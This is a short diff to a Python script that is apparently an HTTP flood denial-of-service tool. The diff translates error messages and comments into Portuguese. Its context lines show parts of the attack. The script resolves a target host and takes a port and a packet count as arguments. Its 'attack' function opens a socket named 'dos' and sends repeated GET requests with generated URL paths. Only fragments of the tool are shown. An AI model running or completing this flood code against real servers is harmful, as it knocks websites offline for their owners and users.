@@ -27,7 +27,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print ("ERROR\n Usage: " + sys.argv[0] + " < Host > < Porta > < pacotes >")
+    print ("ERRO\n Use: " + sys.argv[0] + " < Host > < Porta > < pacotes >")
     sys.exit(1)
 
 # Converter FQDN para IP
@@ -35,7 +35,7 @@ try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    print (" ERROR\n Coloque a website correta!")
+    print (" ERRO\n Coloque a website correta!")
     sys.exit(2)
 
 # Criar ameaças
@@ -61,7 +61,7 @@ def generate_url_path():
     return data
 
 
-# Perform do request
+# Performa do request
 def attack():
     print_status()
     url_path = generate_url_path()
@@ -73,7 +73,7 @@ def attack():
         # socket infos
         dos.connect((ip, port))
 
-        # Send the request according to HTTP spec
+        # HTTP
         #dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
         msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
         byt = msg.encode()
